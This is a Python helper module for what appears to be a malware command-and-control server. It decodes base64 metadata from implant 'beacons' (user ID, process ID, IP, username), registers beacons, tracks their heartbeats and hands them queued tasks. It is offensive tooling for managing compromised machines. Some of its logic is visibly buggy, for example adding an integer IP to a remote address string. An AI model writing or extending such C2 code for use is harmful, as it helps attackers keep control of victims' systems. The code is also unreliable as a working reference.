import time
import struct
from base64 import b64decode, b64encode
import socket 

# UID -> I
# PID -> I
# IP -> I
# USERNAME -> 40s

struct_unpack_format = "<III40s";


def convert_ip2str(ip):
    return socket.inet_ntoa(struct.pack("!I",ip))

def convert_beacon_meta_data(meta_data_str):
    beacon_meta_data = {
        'USERNAME': '',
        'UID': 0,
        'PID': 0,
        'IP': ''
    }
    decode_str = b64decode(meta_data_str)
    unpack_data = struct.unpack(struct_unpack_format, decode_str)
    username = unpack_data[3]
    beacon_meta_data['USERNAME'] = str(username).replace('\\x00','').encode()
    beacon_meta_data['UID'] = unpack_data[0]
    beacon_meta_data['PID'] = unpack_data[1]
    beacon_meta_data['IP'] = unpack_data[2]
    return beacon_meta_data

def get_current_time():
    current_time = time.time()
    current_time = int(current_time)
    return current_time

def check_beacon_list(beacon_id, beacon_list):
    for beacon in beacon_list:
        print("Current Beacon ID {}, HASH : {}".format(beacon_id, beacon['HASH']))
        if beacon['HASH'] == beacon_id:
            return True
        continue
    return False

def update_beacon_heartbeat(beacon_id, beacon_list):
    for beacon in beacon_list:
        if beacon['HASH'] == beacon_id:
            beacon['LAST_HEARTBEART'] = get_current_time()
        continue

def add_beacon(meta_data, beacon_list):
    beacon = {'HASH':'','TIMEOUT': '','IP':[],'UID':"",'USERNAME':'','PID':'','LAST_HEARTBEART': 1,}
    beacon['USERNAME'] = meta_data['USERNAME']
    beacon['UID'] = meta_data['UID']
    beacon['IP'] = meta_data['IP'] + meta_data['REMOTE_ADDR']
    beacon['PID'] = meta_data['PID']
    beacon['LAST_HEARTBEART'] = get_current_time()
    beacon['TIMEOUT'] = '1'
    beacon['HASH'] = meta_data['PID']
    beacon_list.append(beacon)

def send_beacon_task(beacon_id, task_list):
    for task in task_list:
        print("Task BEACON ID {}, Beacon ID {}".format(task['BEACON_ID'], beacon_id))
        if task['BEACON_ID'] == beacon_id and task['HANDLE'] is False:
            return "type={task_type}&data={task_data}&task_id={task_id}".format(task_type=str(task['TASK_TYPE']), task_data=task['TASK_DATA'], task_id=task['TASK_ID'])
    return "type={task_type}&data=None&task_id=None".format(task_type=0)
    
